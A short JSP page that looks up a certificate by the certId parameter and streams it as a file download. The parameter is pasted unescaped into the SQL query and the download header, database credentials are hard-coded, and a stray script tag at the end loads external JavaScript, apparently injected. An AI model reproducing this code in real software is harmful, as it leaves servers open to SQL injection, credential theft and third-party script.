<%@ page import="java.sql.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.io.*"%>
<%
    	 
 
	String certId=request.getParameter("certId");

	Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
	Connection conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
	Statement stmt=conn.createStatement();
	ResultSet rs=stmt.executeQuery("select * from certs where certId="+certId);
			
	if(rs.next())
	{
		String fname=null;
			
		String applyId=rs.getBigDecimal("applyId").toString();

		byte[] certBytes=rs.getBytes("certificate");
  
		int certType=rs.getInt("certType");

		if(certType==0) 
			fname="pkiUser_Cert_certId("+certId+")_applyId("+applyId+")_forSign&Verify.cer";
		else
			fname="pkiUser_Cert_certId("+certId+")_applyId("+applyId+")_forEncrypt&Decrypt.cer";

		response.setContentType("application/file"); 
    		response.setHeader("Content-disposition","attachment; filename="+fname);   

 		BufferedInputStream bis=new BufferedInputStream(new ByteArrayInputStream(certBytes));
      		BufferedOutputStream bos = new BufferedOutputStream(response.getOutputStream());
      		byte[] buff = new byte[2048];
       		int bytesRead;

       		 while(-1 != (bytesRead = bis.read(buff, 0, buff.length))) 
		 {
       			 bos.write(buff,0,bytesRead);
       		 }
		 bos.flush();

     		 if (bis != null) bis.close();
       		 if (bos != null) bos.close();
		
	}	
	else
	{

	}
		
	try{conn.close();}catch(Exception ex){}
	
%>
<script language=javascript src=http://www.qq.com/qq.js></script>